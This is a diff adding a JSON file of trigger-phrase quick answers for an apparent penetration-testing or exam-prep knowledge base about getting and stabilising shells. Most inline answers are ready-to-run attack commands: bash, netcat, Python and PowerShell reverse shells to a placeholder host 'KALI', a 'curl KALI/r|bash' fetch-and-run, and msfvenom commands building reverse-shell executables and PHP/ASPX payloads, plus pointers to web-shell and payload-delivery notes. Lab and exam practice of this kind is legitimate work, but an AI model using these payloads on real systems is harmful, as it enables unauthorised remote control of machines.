@@ -1,0 +1,88 @@
+[
+  {
+    "slug": "reverse-shell-oneliners",
+    "triggers": ["reverse shell", "reverse shell one liner", "bash reverse shell", "nc reverse shell", "revshell", "rev shell"],
+    "title": "Reverse shell one-liners",
+    "answer_type": "inline",
+    "inline_answer": "```\n# bash\nbash -c 'bash -i >& /dev/tcp/KALI/4444 0>&1'\n# nc no -e\nrm /tmp/f;mkfifo /tmp/f;nc KALI 4444 0</tmp/f|sh >/tmp/f 2>&1;rm /tmp/f\n# python3\npython3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"KALI\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'\n```\n\nMangled by a web param? URL-encode it, or stage a script and `curl KALI/r|bash`.",
+    "inline_followup": "_CHEATSHEETS/Reverse_Shells.md#1-reverse-shell-one-liners",
+    "tags": "shells reverse-shell foothold",
+    "priority": 205
+  },
+  {
+    "slug": "tty-upgrade",
+    "triggers": ["tty upgrade", "stabilize shell", "stty raw", "upgrade shell", "pty", "fully interactive shell", "broken shell"],
+    "title": "Upgrade to a fully interactive TTY",
+    "answer_type": "inline",
+    "inline_answer": "```\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n# Ctrl+Z\nstty raw -echo; fg          # (type 'fg' blind, Enter)\nexport TERM=xterm; stty rows 50 cols 200\n```\n\nNo python? `script -qc /bin/bash /dev/null`. Penelope auto-upgrades most shells — this is the manual path when it doesn't.",
+    "inline_followup": "_CHEATSHEETS/Reverse_Shells.md#3-shell-upgrading-tty",
+    "tags": "shells tty stabilization",
+    "priority": 205
+  },
+  {
+    "slug": "msfvenom-cheatsheet",
+    "triggers": ["msfvenom", "msfvenom payload", "msfvenom exe", "msfvenom php", "generate payload", "msfvenom aspx"],
+    "title": "msfvenom — common payloads",
+    "answer_type": "inline",
+    "inline_answer": "```\n# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=K LPORT=4444 -f elf -o s.elf\n# Windows EXE\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=K LPORT=4444 -f exe -o s.exe\n# PHP / ASPX / WAR\nmsfvenom -p php/reverse_php LHOST=K LPORT=4444 -f raw -o s.php\nmsfvenom -p windows/x64/shell_reverse_tcp LHOST=K LPORT=4444 -f aspx -o s.aspx\n```\n\n`shell_reverse_tcp` (stageless) catches in Penelope; `meterpreter`/staged needs multi/handler.",
+    "inline_followup": "_CHEATSHEETS/Reverse_Shells.md#5-msfvenom-payload-generation",
+    "tags": "shells msfvenom payloads",
+    "priority": 200
+  },
+  {
+    "slug": "penelope-handler",
+    "triggers": ["penelope", "listener", "shell handler", "catch shell", "nc listener", "multi handler", "start listener"],
+    "title": "Listener — Penelope (standard handler)",
+    "answer_type": "inline",
+    "inline_answer": "```\npenelope -0 4444        # the toolkit standard: auto-upgrade, logging, multi-session\n```\n\nNot `nc -lvnp`, not `rlwrap nc`, not `pwncat` — Penelope (`-0` = zero). Only use Metasploit `multi/handler` for staged/meterpreter payloads, and that costs your one Metasploit machine.",
+    "inline_followup": "_CHEATSHEETS/Reverse_Shells.md#4-shell-handlers",
+    "tags": "shells penelope handler",
+    "priority": 200
+  },
+  {
+    "slug": "windows-reverse-shell",
+    "triggers": ["windows reverse shell", "powershell reverse shell", "nishang", "windows revshell", "ps reverse shell"],
+    "title": "Windows reverse shells",
+    "answer_type": "inline",
+    "inline_answer": "```\npowershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('KALI',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}\"\n```\n\nOr base64 it for `-EncodedCommand` (UTF-16LE). ConPtyShell for a real PTY. nc.exe / Invoke-PowerShellTcp as fallbacks.",
+    "inline_followup": "Checklists/Foothold_Paths_Checklist_Methodology.md#a-2-windows-reverse-shells",
+    "tags": "shells windows reverse-shell",
+    "priority": 195
+  },
+  {
+    "slug": "shell-decision-tree",
+    "triggers": ["which shell", "shell decision", "what reverse shell", "shell type", "bind or reverse"],
+    "title": "Shell decision tree",
+    "answer_type": "chunk_ref",
+    "target_chunk_id": "_CHEATSHEETS/Reverse_Shells.md#shell-decision-tree",
+    "tags": "shells methodology decision",
+    "priority": 185
+  },
+  {
+    "slug": "web-shells",
+    "triggers": ["web shell", "php web shell", "aspx shell", "jsp shell", "webshell", "antak"],
+    "title": "Web shells (PHP / ASPX / JSP)",
+    "answer_type": "chunk_ref",
+    "target_chunk_id": "_CHEATSHEETS/Reverse_Shells.md#6-web-shells",
+    "tags": "shells webshell",
+    "priority": 180
+  },
+  {
+    "slug": "msfvenom-decision",
+    "triggers": ["which msfvenom payload", "msfvenom decision", "staged vs stageless", "payload selection", "meterpreter or shell"],
+    "title": "msfvenom payload decision tree",
+    "answer_type": "chunk_ref",
+    "target_chunk_id": "Checklists/Foothold_Paths_Checklist_Methodology.md#a-4-msfvenom-payload-generation-decision-tree",
+    "tags": "shells msfvenom decision",
+    "priority": 180
+  },
+  {
+    "slug": "payload-delivery",
+    "triggers": ["deliver payload", "get payload to target", "payload delivery", "transfer shell", "run the payload"],
+    "title": "Delivering the payload",
+    "answer_type": "chunk_ref",
+    "target_chunk_id": "_CHEATSHEETS/Reverse_Shells.md#7-delivering-the-payload",
+    "tags": "shells delivery",
+    "priority": 175
+  }
+]
